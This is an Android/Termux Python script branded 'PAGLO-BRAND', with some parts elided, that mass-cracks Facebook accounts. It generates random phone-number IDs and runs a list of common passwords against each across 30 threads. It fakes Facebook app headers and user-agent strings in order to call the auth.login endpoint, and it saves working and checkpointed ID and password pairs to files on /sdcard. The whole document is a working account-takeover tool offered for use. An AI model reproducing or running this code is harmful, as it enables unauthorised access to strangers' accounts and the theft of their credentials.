...
logo=("""\033[1;37m
   ...
   \x1b[1;91m88oooY' 88oobY' 88ooo88 88V8o 88 88   88 
   \x1b[1;91m88~~~b. 88`8b   88~~~88 88 V8o88 88   88 
   \x1b[1;97m88   8D 88 `88. 88   88 88  V888 88  .8D 
   Y8888P' 88   YD YP   YP VP   V8P Y8888D'
\33[1;37m----------------------------------------------
→   Owner      :  PAGLO-BRAND
→   Facebook   :  PAGLO-BRAND
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as BRAND:     
                        clear()
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','swat1122','swat123','swat123456','khan123456','khankhan123','punjab']
                                BRAND.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [PAGLO-BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in BRAND:
                                ...
                                print('\r\r\033[1;31m [BRAND-CP] %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;31m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m [BRAND-OK] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [PAGLO-BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/318.0.0.25.68;FBBV/450708040;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1464};FB_FW/1;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        ...
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "AdsManagerNotificationsPageQuery",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        ...
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'AdsManagerNotificationsPageQuery',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BRAND-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [BRAND-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/BRAND-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [BRAND-OK] '+uid+' | '+pas+'\033[1;97m')
